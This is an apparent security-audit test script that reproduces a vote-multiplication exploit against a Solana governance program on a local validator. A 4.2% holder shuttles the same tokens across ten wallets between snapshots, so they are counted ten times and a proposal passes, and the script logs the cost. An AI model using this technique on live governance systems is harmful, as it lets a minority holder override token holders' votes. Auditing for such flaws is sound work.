// A2b — how far does the wallet-hopping trick scale, and what does it cost?  A 4.2% holder spreads his coins over
// 10 wallets and shuttles the SAME coins to the next wallet after each owner snapshot transaction.
//   ANCHOR_PROVIDER_URL=http://127.0.0.1:8899 npx ts-node audit/a2b_hopping_scale.ts
import { Keypair } from "@solana/web3.js";
import { makeWorld, group, record, COIN, SOL, finish, errText, conn } from "./lib";

async function main() {
  group("A2b hopping at scale");
  const N = 10;
  const w = await makeWorld({ name: "a2b", params: { cooldown: 0, vote: 20, timelock: 5, quorumParamBps: 1500 } });
  const B = await w.holder(60_000_000n, 20);
  const D = await w.holder(150_000_000n, 20);
  const wallets: Keypair[] = [];
  for (let i = 0; i < N; i++) wallets.push(await w.holder(i === 0 ? 42_000_000n : 0n, 2)); // only wallet 0 really holds coins (4.2% of supply)
  const attackerSolBefore = (await Promise.all(wallets.map((k) => conn.getBalance(k.publicKey)))).reduce((a, b) => a + BigInt(b), 0n);

  // a harmless governance change: raise the finance minister's daily limit 50 → 60 bps
  const p = await w.propose(4, w.me, 60, 5, "hopping at scale");
  await w.snapshot(p.id, p.pPda, D.publicKey); // the site posts holders in DESCENDING balance order: D, B, then the attacker's wallets
  await w.snapshot(p.id, p.pPda, B.publicKey);
  for (let i = 0; i < N; i++) {
    await w.snapshot(p.id, p.pPda, wallets[i].publicKey); // weight = whatever wallet i holds RIGHT NOW (42M each time)
    if (i + 1 < N) await w.transferCoins(wallets[i], wallets[i + 1].publicKey, 42_000_000n); // slipped in before the next owner tx
  }
  for (const k of wallets) await w.vote(k, p.id, p.pPda, true);
  await w.vote(D, p.id, p.pPda, false);
  await w.vote(B, p.id, p.pPda, false);
  const pr = await w.proposalOf(p.pPda);
  const vf = BigInt(pr.votesFor.toString()), va = BigInt(pr.votesAgainst.toString());
  await w.waitExecutable(p.pPda);
  let executed = false, err = "";
  try { await w.execute(p.id); executed = true; } catch (e) { err = errText(e).slice(0, 100); }
  const cfg = await w.cfg();
  record(
    "A2b.1",
    `a 4.2% holder (42M coins) uses ${N} wallets: his coins are counted ${N}×`,
    executed ? "EXPLOITABLE" : "BLOCKED",
    `counted for=${vf / COIN / 1_000_000n}M (real stack 42M) vs against=${va / COIN / 1_000_000n}M (honest opposition 210M) → passes; finance_daily_bps is now ${cfg.financeDailyBps} (was 50). ${err}`
  );
  const attackerSolAfter = (await Promise.all(wallets.map((k) => conn.getBalance(k.publicKey)))).reduce((a, b) => a + BigInt(b), 0n);
  record("A2b.2", "cost of the multiplier: SOL spent by the ten wallets (token-account rent is paid by the deployer in this harness; the rest is fees)", "INFO",
    `≈${(Number(attackerSolBefore - attackerSolAfter) / 1e9).toFixed(5)} SOL in transaction fees; plus ≈0.002 SOL rent per extra token account (${N - 1} more) → well under 0.05 SOL in total. The counter (u64) only overflows after ≈18× total supply`);
  finish("audit/results_a2b.json");
}
main().catch((e) => { console.error(e); process.exit(1); });
